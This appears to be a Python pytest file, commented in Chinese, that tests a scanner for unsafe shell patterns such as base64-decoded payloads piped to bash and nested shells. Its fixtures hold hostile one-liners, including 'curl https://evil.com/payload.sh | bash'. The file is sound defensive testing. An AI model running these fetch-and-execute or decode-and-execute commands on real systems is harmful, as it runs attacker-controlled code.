"""[L2+L5] check_unsafe_patterns.py 单元测试"""
import sys
import tempfile
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from check_unsafe_patterns import scan_file, scan_dir, is_meta_description


def test_detects_bash_decode_pipe():
    """检测 bash -c "echo $B64 | base64 -d | bash" """
    with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
        f.write('bash -c "echo $B64 | base64 -d | bash"\n')
        path = Path(f.name)
    try:
        findings = scan_file(path)
        assert any("base64" in f.get("pattern", "") for f in findings)
    finally:
        path.unlink()


def test_detects_python_base64_decode_write():
    """检测 Python base64.b64decode > /tmp/x.py"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write('open("/tmp/m.py","w").write(base64.b64decode(encoded).decode())\n')
        path = Path(f.name)
    try:
        findings = scan_file(path)
        assert any("base64" in f.get("pattern", "").lower() for f in findings)
    finally:
        path.unlink()


def test_detects_curl_pipe_bash():
    """检测 curl URL | bash (反向 shell)"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
        f.write("curl https://evil.com/payload.sh | bash\n")
        path = Path(f.name)
    try:
        findings = scan_file(path)
        assert any("reverse shell" in f.get("pattern", "").lower() or "curl" in f.get("pattern", "") for f in findings)
    finally:
        path.unlink()


def test_detects_127_localhost():
    """检测 HTTP 127.0.0.1 自调用 (L1)"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write('cmd = "curl http://127.0.0.1:9101/api/exec?cmd=xxx"\n')
        path = Path(f.name)
    try:
        findings = scan_file(path)
        assert any("127.0.0.1" in f.get("pattern", "") or "L1" in f.get("pattern", "") for f in findings)
    finally:
        path.unlink()


def test_detects_nested_shell():
    """检测 sh -c nested bash -c base64 (L5)"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
        f.write('sh -c "bash -c \\"echo $B64 | base64 -d\\""\n')
        path = Path(f.name)
    try:
        findings = scan_file(path)
        assert any("多层" in f.get("pattern", "") or "nested" in f.get("pattern", "").lower() for f in findings)
    finally:
        path.unlink()


def test_ignores_meta_description():
    """元描述 (讨论修复方法) 应豁免"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write('cmd = "禁止: bash -c base64 -d"  # 应改用 HTTP\n')
        path = Path(f.name)
    try:
        findings = scan_file(path)
        assert len(findings) == 0
    finally:
        path.unlink()


def test_ignores_docstring():
    """docstring 中的反模式字符串应豁免"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write('''"""
This module used to do: bash -c "echo $B64 | base64 -d | bash"
but was fixed.
"""
import urllib.request
''')
        path = Path(f.name)
    try:
        findings = scan_file(path)
        assert len(findings) == 0
    finally:
        path.unlink()


def test_ignores_clean_code():
    """干净的代码不报警"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write('import urllib.request\nurllib.request.urlopen("http://172.20.59.7:9101/api/exec?cmd=ls")\n')
        path = Path(f.name)
    try:
        findings = scan_file(path)
        assert len(findings) == 0
    finally:
        path.unlink()


def test_is_meta_description_helper():
    """is_meta_description 助手函数正确"""
    assert is_meta_description("应改用 HTTP")
    assert is_meta_description("禁止 base64")
    assert is_meta_description("L1 禁止")
    assert not is_meta_description("import base64")
    assert not is_meta_description("print('hello')")


def test_scan_dir_recursive(tmp_path):
    """递归扫描"""
    (tmp_path / "ok.py").write_text("import urllib.request\n")
    (tmp_path / "bad.py").write_text('open("/tmp/x.py","w").write(base64.b64decode(x))\n')
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "evil.sh").write_text('curl https://x.com | bash\n')

    findings = scan_dir(tmp_path)
    files = {f["file"] for f in findings}
    assert any("bad.py" in f for f in files)
    assert any("evil.sh" in f for f in files)
    assert not any("ok.py" in f for f in files)


def test_scan_dir_skips_pycache(tmp_path):
    """__pycache__ 不扫描"""
    pycache = tmp_path / "__pycache__"
    pycache.mkdir()
    (pycache / "cached.py").write_text('open("/tmp/x.py","w").write(base64.b64decode(x))\n')

    findings = scan_dir(tmp_path)
    assert all("__pycache__" not in f["file"] for f in findings)


def test_real_tools_audit():
    """实际扫描 tools/ (修复后应该 0 个 P0)"""
    tools_path = Path("tools")
    if not tools_path.exists():
        pytest.skip("tools/ not found")

    findings = scan_dir(tools_path)
    p0_count = sum(1 for f in findings if f.get("severity") == "P0")
    p1_count = sum(1 for f in findings if f.get("severity") == "P1")
    print(f"\nReal audit: P0={p0_count}, P1={p1_count}")
    # 修复 monitor_prod.py 后应该 0 P0
    assert p0_count == 0, f"expected 0 P0 findings (post-fix), got {p0_count}"


def test_no_self_match():
    """脚本自身不应被检测"""
    findings = scan_file(Path("tools/check_unsafe_patterns.py"))
    p0 = [f for f in findings if f.get("severity") == "P0"]
    assert len(p0) == 0, f"self-match: {[f['pattern'] for f in p0]}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])